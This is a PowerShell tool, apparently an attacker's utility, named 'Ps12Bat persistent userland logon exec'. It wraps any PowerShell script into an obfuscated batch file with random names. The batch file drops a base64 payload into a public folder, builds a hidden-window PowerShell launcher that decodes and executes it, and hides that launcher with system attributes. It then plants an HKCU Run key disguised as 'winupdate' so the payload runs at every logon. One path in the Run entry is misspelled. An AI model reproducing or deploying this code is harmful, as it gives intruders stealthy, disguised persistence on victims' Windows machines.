function b64enc {

	param($string)

	# Use this to encode strings to base64 format
	$encstring = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($string))

	return $encstring
}

function b64dec {

	param($encstring)

	# Don't have to worry about unsafe url characters since it's content not a url string
	$decstring = [System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String($encstring))

	return $decstring
}

function rand-str {

        $rint = get-random -max 10 -min 3
        $charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
        1..$rint | % { $rchr += $charArray | get-random }
        $randstr = [string]::join("", ($rchr))

        return $randstr
}

function genenc-script {
	Param(
		[Parameter(Mandatory=$true, Position=0)]
		[Alias('LiteralPath')]
		[string[]]$script
	)
	
	$scriptpath = Get-Item -LiteralPath $script
	$s = ($scriptpath.FullName)
	$sname = ($scriptpath.Name)
	
	#write-output "[1] $s "
    	#write-output "[2] $sname"
	
   	$encscript = b64enc $(get-content $s | out-string )
	
  	$newline = "`r`n"
    $cmdstrArray = @()
    [int]$lineccnt = '0'
	[int]$loop = '0'

	$randb64var = rand-str
	$randb64name = rand-str
	$randrunvar = rand-str
	$randrunname = rand-str
	
   	$cmdfile = $newline + 'set ' + $randb64var + '=' + $randb64name + '.b64'
	$cmdfile += $newline + 'set ' + $randrunvar + '=' + $randrunname + '.cmd' + $newline + $newline
	
	$charArray = $encscript.ToCharArray()
	[int]$total = $charArray.count
	[int]$loopccnt = '0'
	
	foreach ($char in $charArray)
    {
		$loopccnt++
		$lineccnt++
		$loop++	
	
		if ( [int]$lineccnt -eq '1' )
		{
			$cmdfile += 'echo | set /p="' + $char
		} else {
			$cmdfile += $char
		}
	
		if ($loopccnt -ne $total) {
			if ($loop -eq '70' ) {  $cmdfile += '">> .\%' + $randb64var + '%' + $newline; [int]$lineccnt = 0 ; [int]$loop = 0 }
		} else {
			$cmdfile += '">> .\%' + $randb64var + '%' + $newline
		}
		

	}
	
	$cmdfile += $newline
	$cmdfile += 'copy .\%' + $randb64var + '% "C:\Users\Public\appdata\"' + $newline
	$cmdfile += 'echo powershell -w hidden -c "&{ $e = $( get-content ''C:\Users\Public\appdata\%' + $randb64var + '%'' | out-string ); $s = [System.Text.Encoding]::UTF8.getString([System.Convert]::Frombase64String($e)); iex -command $s }" > .\%' + $randrunvar +'%' 
	$cmdfile += $newline
	$cmdfile += 'copy .\%' + $randrunvar + '% "C:\Users\Public\appdata\"' + $newline
	$cmdfile += 'attrib +A +S +H "C:\Users\Public\appdata\%' + $randrunvar + '%"' + $newline
	
	#:: HKEY LOCAL MACHINE need administrator privs for this key
	# $cmdfile += 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v winupdate /t reg_sz /d "c:\abctest.exe"' + $newline

	#:: HKEY CURRENT USER
	$cmdfile += 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winupdate /t reg_sz /d "c:\widows\system32\cmd.exe /q /c c:\users\Public\appdata\%' + $randrunvar + '%"' + $newline
	$cmdfile += 'exit' + $newline
	
	# $encscript | out-file -filepath $encSpath -Force
	write-output "[+] Generating encoded script block ready for batch file use ..."
	
	$randbat = rand-str 
	$batchfileName = $randbat + '.bat'
	$path = (Get-Item -Path ".\").FullName
	$filepath = $path + '\' + $batchfileName
	set-content $filepath $cmdfile -Encoding ASCII
	
	write-output "[+] Saved batch file to: $filepath "
}

write-output "[>] Ps12Bat persistent userland logon exec"
write-output "============================================================================"
$pshPath = ''
$pshPath = read-host -prompt "[+] Enter path to powershell script "
genenc-script $pshPath
write-output "============================================================================"
